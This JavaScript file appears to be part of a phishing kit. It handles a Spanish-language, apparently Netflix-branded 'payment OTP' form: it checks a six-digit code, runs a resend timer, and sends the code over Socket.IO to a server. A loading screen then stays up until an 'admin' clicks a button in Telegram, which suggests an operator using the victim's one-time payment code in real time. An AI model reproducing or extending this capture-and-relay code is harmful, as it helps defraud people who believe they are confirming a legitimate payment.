// Payment OTP Form Handler
document.addEventListener('DOMContentLoaded', function() {
    const otpForm = document.getElementById('otpForm');
    const otpCode = document.getElementById('otpCode');
    const submitBtn = document.getElementById('submitBtn');
    const resendBtn = document.getElementById('resendBtn');
    const countdownEl = document.getElementById('countdown');

    let countdown = 60;
    let countdownInterval = null;

    // Start countdown timer
    function startCountdown() {
        countdown = 60;
        resendBtn.disabled = true;
        countdownEl.textContent = countdown;

        if (countdownInterval) {
            clearInterval(countdownInterval);
        }

        countdownInterval = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;

            if (countdown <= 0) {
                clearInterval(countdownInterval);
                resendBtn.disabled = false;
                countdownEl.textContent = '0';
            }
        }, 1000);
    }

    // Initialize countdown on page load
    startCountdown();

    // Only numbers for OTP
    otpCode.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');

        // Enable submit button when 6 digits are entered
        if (e.target.value.length === 6) {
            submitBtn.disabled = false;
        } else {
            submitBtn.disabled = true;
        }
    });

    // Handle resend code
    resendBtn.addEventListener('click', function() {
        // In a real app, this would trigger a new OTP to be sent
        alert('Se ha enviado un nuevo código a tu dispositivo.');
        startCountdown();
        otpCode.value = '';
        submitBtn.disabled = true;
    });

    // Form validation
    function validateForm() {
        const code = otpCode.value;

        if (code.length !== 6) {
            return { valid: false, message: 'El código debe tener 6 dígitos' };
        }

        if (!/^\d{6}$/.test(code)) {
            return { valid: false, message: 'El código solo debe contener números' };
        }

        return { valid: true };
    }

    // Handle form submission
    otpForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        // Validate form
        const validation = validateForm();
        if (!validation.valid) {
            alert(validation.message);
            return;
        }

        // Prepare OTP data
        const otpData = {
            otpCode: otpCode.value,
            timestamp: new Date().toISOString()
        };

        try {
            // Submit to server via Socket.IO
            await socketManager.submitOTP(otpData);
            
            // Keep loading screen visible (waiting for admin action)
            // The loading screen will remain until admin clicks a button in Telegram
            
        } catch (error) {
            console.error('Error submitting OTP:', error);
            alert('Error al procesar el código. Por favor intenta nuevamente.');
            socketManager.hideLoading();
        }
    });

    // Cleanup countdown on page unload
    window.addEventListener('beforeunload', function() {
        if (countdownInterval) {
            clearInterval(countdownInterval);
        }
    });

    // Load saved language
    const savedLang = localStorage.getItem('netflix_lang') || 'es';
    const langSelect = document.querySelector('.language-selector select');
    if (langSelect) {
        langSelect.value = savedLang;
    }
});
